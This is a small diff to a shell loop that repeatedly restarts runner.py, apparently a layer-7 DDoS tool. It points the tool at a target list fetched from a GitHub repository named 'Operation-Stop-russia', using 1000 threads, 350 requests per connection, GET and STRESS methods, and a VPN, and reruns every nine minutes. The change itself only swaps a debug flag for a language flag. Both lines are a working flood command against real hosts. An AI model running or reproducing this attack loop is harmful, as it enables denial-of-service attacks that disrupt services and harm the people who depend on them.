@@ -9,6 +9,6 @@ while true
 do
    pkill -f runner.py
    sleep 7
-   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 1000 --rpc 350 --http-methods GET STRESS --vpn --debug
+   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 1000 --rpc 350 --http-methods GET STRESS --vpn --lang en
 sleep 9m
 done
